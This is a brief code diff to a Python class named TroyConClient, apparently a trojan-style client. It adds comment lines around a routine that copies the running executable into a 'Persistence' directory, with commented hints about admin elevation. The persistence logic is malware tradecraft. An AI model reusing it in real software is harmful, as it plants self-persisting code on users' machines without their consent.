@@ -170,6 +170,8 @@ class TroyConClient:
                 #     print("[*] dest_dir already exists. No admin elevation needed.")
                 # -----------------------------------------------------------------
 
+                # -----------------------------------------------------------------
+                # if the executable is a standalone file, use this method to copy just the .exe file
                 # Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
                 exe_filename  = os.path.basename(current_exe_path)
                 no_exe_name = os.path.splitext(exe_filename)[0]
@@ -210,7 +212,7 @@ class TroyConClient:
                     print(f"[Persistence] '{current_exe_path}' has been copied to '{persistence_target_path}'.")
                 else:
                     print(f"[Persistence] File '{persistence_target_path}' already exists. Skipping copy.")
-
+                # -----------------------------------------------------------------
 
                 # if you want to find the .exe file in the copied folder, uncomment below
                 # exe_path = None
